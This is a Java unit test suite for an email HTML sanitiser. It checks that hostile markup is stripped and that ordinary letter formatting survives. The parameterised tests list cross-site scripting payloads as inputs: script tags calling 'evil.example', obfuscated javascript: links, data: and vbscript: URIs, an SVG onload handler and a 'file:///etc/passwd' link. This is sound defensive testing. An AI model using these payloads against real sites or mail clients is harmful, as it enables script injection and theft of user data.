package com.jarurat.mailer.mail;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * The outbound allowlist, from both directions.
 *
 * Half of these check that nothing hostile survives, which is the obvious half. The
 * other half check that the letter does, which matters just as much: a sanitiser that
 * eats a donor thank-you is not a safe sanitiser, it is a broken product that people
 * will route around by pasting into Gmail instead, and then none of this runs at all.
 */
class OutboundHtmlTest {

    // ------------------------------------------------------------------ what must not survive

    @ParameterizedTest
    @DisplayName("script bearing markup leaves nothing behind")
    @ValueSource(strings = {
            "<script>fetch('//evil')</script>",
            "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
            "<style>@import url(//evil)</style>",
            "<iframe src=\"https://evil.example\"></iframe>",
            "<object data=\"x.swf\"></object>",
            "<form action=\"//evil\"><input name=\"card\"></form>",
            "<svg onload=alert(1)></svg>",
            "<!--[if mso]><v:shape/><![endif]-->"})
    void executableMarkupIsRemoved(String hostile) {
        String out = OutboundHtml.clean("<p>Before</p>" + hostile + "<p>After</p>");
        assertThat(out).contains("Before").contains("After");
        assertThat(out.toLowerCase())
                .doesNotContain("script").doesNotContain("iframe").doesNotContain("object")
                .doesNotContain("<form").doesNotContain("<input").doesNotContain("<svg")
                .doesNotContain("evil").doesNotContain("card");
    }

    @ParameterizedTest
    @DisplayName("an event handler attribute never survives, whatever it is spelled")
    @ValueSource(strings = {"onclick", "onerror", "onload", "onmouseover", "ONCLICK"})
    void eventHandlersAreDropped(String handler) {
        String out = OutboundHtml.clean("<p " + handler + "=\"x()\">Hello</p>");
        assertThat(out).isEqualTo("<p>Hello</p>");
    }

    /**
     * The scheme is read after whitespace, control characters and entities have been
     * taken out, because every one of those three is a way of making javascript: look
     * like something else to a filter and like itself to a browser.
     */
    @ParameterizedTest
    @DisplayName("a link that is not http, https, mailto or tel is dropped")
    @ValueSource(strings = {
            "javascript:alert(1)",
            "java\tscript:alert(1)",
            "&#106;avascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:msgbox",
            "file:///etc/passwd",
            "/relative/path"})
    void hostileLinkSchemesAreDropped(String href) {
        String out = OutboundHtml.clean("<a href=\"" + href + "\">click</a>");
        assertThat(out).isEqualTo("<a>click</a>");
    }

    @ParameterizedTest
    @DisplayName("a link people actually send survives untouched")
    @ValueSource(strings = {
            "https://jarurat.care/donate",
            "http://example.org",
            "mailto:priya@jarurat.care",
            "tel:+912212345678"})
    void goodLinkSchemesSurvive(String href) {
        assertThat(OutboundHtml.clean("<a href=\"" + href + "\">go</a>"))
                .isEqualTo("<a href=\"" + href + "\">go</a>");
    }

    /**
     * The clearest difference from the reader's policy, and the reason a shared class
     * would have been wrong. Inbound every anchor is hardened; outbound the link is
     * ours and neither attribute means anything we want to say.
     */
    @Test
    @DisplayName("outbound anchors get no target and no rel")
    void outboundAnchorsAreNotHardened() {
        String out = OutboundHtml.clean("<a href=\"https://jarurat.care\">us</a>");
        assertThat(out).doesNotContain("target").doesNotContain("rel=").doesNotContain("nofollow");
    }

    @Test
    @DisplayName("a style declaration outside the allowlist is dropped and the rest kept")
    void cssIsFilteredByProperty() {
        String out = OutboundHtml.clean(
                "<p style=\"color:#00697f;position:fixed;background:url(//tracker/p.gif);"
                        + "font-weight:bold;behavior:url(x.htc)\">Hi</p>");
        assertThat(out).isEqualTo("<p style=\"color:#00697f;font-weight:bold\">Hi</p>");
    }

    @Test
    @DisplayName("a stylesheet is dropped whole rather than rebuilt")
    void styleElementsAreNotKept() {
        // Outlook ignores a style element and Gmail counts it against the 102KB it
        // clips at, so keeping one produces mail that looks right only to us.
        assertThat(OutboundHtml.clean("<style>p{color:red}</style><p>Hi</p>")).isEqualTo("<p>Hi</p>");
    }

    @Test
    @DisplayName("Word's namespaced elements and MsoNormal classes come out")
    void wordPasteIsCleanedUp() {
        String word = "<p class=\"MsoNormal\"><o:p>&nbsp;</o:p>Dear Dr Rao<w:sdt>x</w:sdt></p>";
        String out = OutboundHtml.clean(word);
        assertThat(out).contains("Dear Dr Rao");
        assertThat(out).doesNotContain("MsoNormal").doesNotContain("o:p").doesNotContain("w:sdt");
    }

    @Test
    @DisplayName("markup over the ceiling is refused rather than truncated")
    void oversizeIsRefused() {
        assertThatThrownBy(() -> OutboundHtml.clean("x".repeat(OutboundHtml.MAX_HTML + 1)))
                .isInstanceOf(MailException.class)
                .hasMessageContaining("Gmail");
    }

    // ------------------------------------------------------------------ what must survive

    @Test
    @DisplayName("the formatting a person actually uses comes through, renamed for screen readers")
    void ordinaryFormattingSurvives() {
        String out = OutboundHtml.clean(
                "<p>Dear <b>Dr Rao</b>, the <i>camp</i> is <u>confirmed</u>.</p>"
                        + "<ul><li>Nashik</li><li>Pune</li></ul>"
                        + "<blockquote>Your earlier note</blockquote>");
        assertThat(out).isEqualTo(
                "<p>Dear <strong>Dr Rao</strong>, the <em>camp</em> is <u>confirmed</u>.</p>"
                        + "<ul><li>Nashik</li><li>Pune</li></ul>"
                        + "<blockquote>Your earlier note</blockquote>");
    }

    @Test
    @DisplayName("an unknown element is unwrapped so the words are never lost")
    void unknownElementsAreUnwrappedNotDeleted() {
        assertThat(OutboundHtml.clean("<p><section><custom-tag>Important</custom-tag></section></p>"))
                .isEqualTo("<p>Important</p>");
    }

    @Test
    @DisplayName("an ampersand the sender typed is escaped once and not once per save")
    void entitiesAreNotDoubleEscaped() {
        String once = OutboundHtml.clean("<p>Tata Memorial &amp; Jarurat &lt;3 R&amp;D</p>");
        assertThat(once).isEqualTo("<p>Tata Memorial &amp; Jarurat &lt;3 R&amp;D</p>");
        // A draft is cleaned on every autosave, so this has to be a fixed point.
        assertThat(OutboundHtml.clean(once)).isEqualTo(once);
    }

    @Test
    @DisplayName("an unclosed tag is closed rather than left to run into the quoted history")
    void unbalancedMarkupIsClosed() {
        assertThat(OutboundHtml.clean("<p>Hello <strong>there")).isEqualTo("<p>Hello <strong>there</strong></p>");
    }

    @Test
    @DisplayName("a stray closing tag is dropped instead of unbalancing the output")
    void strayClosingTagsAreDropped() {
        assertThat(OutboundHtml.clean("Hello</div></p>")).isEqualTo("Hello");
    }

    // ------------------------------------------------------------------ the text alternative

    @Test
    @DisplayName("the text part is a readable letter and not a tag strip")
    void textAlternativeReadsAsALetter() {
        String text = OutboundHtml.toText(
                "<p>Dear Dr Rao,</p>"
                        + "<p>The camp is <strong>confirmed</strong>. Dates:</p>"
                        + "<ol><li>12 September</li><li>13 September</li></ol>"
                        + "<blockquote><p>Can you confirm the dates?</p></blockquote>"
                        + "<p>Thanks,<br>Priya</p>");
        assertThat(text).isEqualTo(String.join("\n",
                "Dear Dr Rao,",
                "",
                "The camp is confirmed. Dates:",
                "",
                "1. 12 September",
                "2. 13 September",
                "",
                "> Can you confirm the dates?",
                "",
                "Thanks,",
                "Priya"));
    }

    @Test
    @DisplayName("a link whose text is not its address carries the address beside it")
    void linksKeepTheirAddress() {
        assertThat(OutboundHtml.toText("<p>Please <a href=\"https://jarurat.care/donate\">donate</a>.</p>"))
                .isEqualTo("Please donate <https://jarurat.care/donate>.");
    }

    @Test
    @DisplayName("a link that already shows its address is not printed twice")
    void linksThatShowTheirAddressAreNotRepeated() {
        assertThat(OutboundHtml.toText("<a href=\"https://jarurat.care\">https://jarurat.care</a>"))
                .isEqualTo("https://jarurat.care");
    }

    @Test
    @DisplayName("source indentation does not arrive as indentation in the letter")
    void whitespaceIsCollapsed() {
        assertThat(OutboundHtml.toText("<p>\n    Hello     there\n</p>")).isEqualTo("Hello there");
    }
}
